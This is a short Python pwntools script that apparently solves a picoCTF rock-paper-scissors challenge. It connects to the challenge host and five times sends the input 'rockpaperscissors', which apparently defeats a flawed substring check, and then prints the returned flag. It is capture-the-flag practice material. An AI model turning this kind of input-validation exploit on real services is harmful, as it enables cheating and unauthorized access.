from pwn import *

#r = process('./output')
HOST, PORT = "saturn.picoctf.net 51271".split()
r = remote(HOST, PORT)

for i in range(5):
    r.recvuntil(b'exit the program\r\n')
    r.sendline(b'1')
    r.recvuntil(b'):\r\n')
    r.sendline(b'rockpaperscissors')
r.recvuntil(b'flag!\r\n')

flag = r.recvline()
print(flag.decode())
r.interactive()